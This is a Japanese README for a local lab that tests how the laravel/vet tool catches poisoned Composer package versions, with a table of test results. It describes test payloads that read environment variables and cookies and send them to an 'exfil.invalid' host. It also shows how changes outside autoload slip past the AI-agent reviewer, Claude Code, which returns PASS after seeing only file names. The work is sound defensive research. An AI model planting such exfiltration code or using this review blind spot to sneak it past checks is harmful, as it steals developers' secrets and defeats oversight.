# lab-laravel-vet

[laravel/vet](https://github.com/laravel/vet)（v0.2.1）の挙動を、手元で配る架空パッケージ `vetlab/widget` で確かめるための検証環境。2026年9月29日に作成。

## 使い方

このフォルダで `composer` や `vet` を動かすときは、**先に `. ./env.sh` を読み込むこと**（読み込まないとテスト用の認証局を信頼できず、取得が失敗する）。

```sh
sh setup.sh              # 初回・フォルダを移動したとき・証明書が切れたとき（1年）
sh agent-demo.sh 1.0.1   # サーバーを起動し、1.0.0 → 1.0.1 の更新を保留にする（1.1.0 も指定できる）
```

`agent-demo.sh` が次に実行するコマンド（`./vendor/bin/vet`）とサーバーの止め方を表示する。`vet` の画面で「Automatically, with my coding agent」を選ぶと、`PATH` 上の `claude` がレビューする。

クローン直後は `vendor/`・`repo/` の中身・認証局が無いので、`sh setup.sh` のあと `sh agent-demo.sh` を一度実行する（サーバーを起動し、`vetlab/widget` の各版を作り、`app/vendor/` を lock から入れる）。

つまずきやすい点:

- フォルダを移動・改名したら `sh setup.sh` を再実行する。`env.sh` と `php-ini/zz-vetlab.ini` は絶対パスを持つので、古いままだと `agent-demo.sh` は `cd` で終了し、PHP はテスト用の認証局を信頼しない。
- ターミナルの `claude` は別途ログインが要る（`claude auth login`、確認は `claude auth status`）。デスクトップアプリのログインは引き継がれない。未ログインだと Vet は `WARN  The agent stopped with exit code [1]: … Failed to authenticate` を出す（テストI）。
- `agent-demo.sh` を続けて実行するときは、先に前回のサーバーを止める。止めないと2つ目がポート競合で死に、`logs/serve.pid` が死んだ pid を指す。

## 構成

| パス | 中身 |
|---|---|
| `setup.sh` | この場所に合わせて、テスト用の認証局・サーバー証明書・PHP の設定（`php-ini/`）・`env.sh` を作り直す |
| `env.sh` | Composer と Vet のキャッシュをこのフォルダに閉じ込め、PHP にテスト用の認証局を信頼させる |
| `serve.py` | `repo/` を `https://127.0.0.1:8443` で配る（Vet は https 以外から取らない）。取得元の User-Agent を `logs/server.log` に残す |
| `build_repo.py` | `vetlab/widget` の各版を作り、配る状態を切り替える（下表） |
| `bin/claude` | エージェントのスタブ。受け取ったプロンプトを `prompts/` に保存し「clear」と答える。`PATH` の先頭に置いたときだけ使われる |
| `drive.py` | Vet の対話画面を疑似端末でキー操作する |
| `app/` | 検証用プロジェクト（Vet・`psr/log`・`vetlab/widget`） |
| `app-fresh/`・`app-fresh2/` | `vendor/` の無い環境の再現（テストD）。`payload-ran.txt` はペイロードが実行された印 |
| `logs/`・`prompts/` | 検証時の記録（対話画面の記録、スタブが受け取ったプロンプト） |

| `vetlab/widget` の版 | 中身 |
|---|---|
| 1.0.0 | きれいな版 |
| 1.0.1 | `autoload.files` に `src/helpers.php` を足した版（Laravel-Lang 型） |
| 1.1.0 | autoload の外（`config/widget.php`・`dist/widget.min.js`）だけを変えた版 |
| 1.3.0 / 1.3.1 | 公開直後の版。1.3.0 は正直な日付、1.3.1 は2020年付けに偽装 |

`build_repo.py` の状態は `baseline`（1.0.0・1.0.1・1.1.0）、`rewrite`（1.0.0 の中身を差し替え）、`young`（＋1.3.0）、`backdated`（＋1.3.1）。

ペイロードは無害: `payload-ran.txt` を書くだけで、通信は `VETLAB_LIVE=1` のときしか実行されず、宛先も解決できない `.invalid`。

## 検証結果（2026年9月29日、Vet v0.2.1・Composer 2.9.3）

| # | やったこと | 結果 |
|---|---|---|
| A | `psr/log` 3.0.0 → 3.0.2 | 差分を見せて停止、`vendor/` は無傷。ただし `composer.lock` は止まる前に 3.0.2 へ書き換わる |
| B | `autoload.files` の追加（1.0.1） | 停止。zip を取りに来たのは Vet だけで、Composer はダウンロードしていない |
| C | 同じ 1.0.0 の中身の差し替え | 「same version, different code」として停止 |
| D | `vendor/` の無い環境で `composer update` | ペイロードが実行された**後で** Vet の照合が失敗する |
| D2 | 同じ環境で `composer install --no-scripts` | ペイロードは実行されず、Vet の照合は走って止まる（`--no-scripts` はプラグインを止めない） |
| E | autoload の外だけの変更（1.1.0） | エージェントへのプロンプトに中身が1バイトも入らず、`PASS` のまま選択済みになる |
| F | 公開7日未満の版の足止め | 正直な日付の 1.3.0 は止まり、日付を偽った 1.3.1 はすり抜ける（信頼の確認では止まる） |
| G | `vendor/` 内の直接の書き換え | 「same version, different code」として検知し、Packagist の公開版との差分を出す |
| H | 手動で信頼を記録 | `vet.json` が更新され、その後の `composer install` が通る |
| I | エージェントが失敗（未ログインで exit 1） | `WARN` を出し、選択画面は**未選択**で出る。Enter だけなら「Recorded nothing」で、通すのは人がスペースで選んだときだけ |

A〜H は同日夜に、フォルダを `lab-laravel-vet` に改名して `setup.sh` を再実行した後、もう一度すべて再現した。D・D2 は `app-fresh/` の `composer.json`・`composer.lock`・`vet.json` を写した一時フォルダで実行。

### 本物のエージェント（Claude Code 2.1.212）でのレビュー

上の B・E はスタブ（`bin/claude`）での結果。同日、ログイン済みの本物の `claude` で B と E を流した。

| 版 | エージェントに渡った中身 | 判定 | 選択画面の初期状態 |
|---|---|---|---|
| 1.0.1（`autoload.files` 注入） | 全文（4.9 KB） | `FAIL`。`autoload.files` 経由で毎回実行されること、`dirname(__DIR__, 4)` でパッケージ外に書くこと、環境変数を読んで `exfil.invalid` へ POST することを正確に指摘 | 未選択 |
| 1.1.0（autoload の外だけ） | ファイル名のみ（3.8 KB。スタブが記録した 3,895 バイトのプロンプトと一致） | `PASS`「Only inert files (README, config, minified JS) changed with no autoload, bin, or script reference」 | **選択済み**（Enter で 1.1.0 の信頼が記録された） |

1.1.0 の `PASS` は「安全と判断した」ではなく「判断材料を渡されなかった」結果。Vet は `claude` を `--tools ""`（ツール無し）で呼ぶので、エージェントが自分でファイルを読みに行くこともできない。画面の上半分（人間向けの差分）には `config/widget.php` の `getenv` → `file_get_contents('https://exfil.invalid/…')` と `dist/widget.min.js` 末尾の `document.cookie` 送信がそのまま出ているのに、エージェントの判定理由はファイルの種類にしか触れていない。Laravel パッケージでは `config/` をサービスプロバイダが実行時に読むので、この境界は実害につながりうる。

エージェントの判定と選択画面の初期状態の対応: `PASS` → 選択済み、`FAIL`・`WARN` → 未選択。
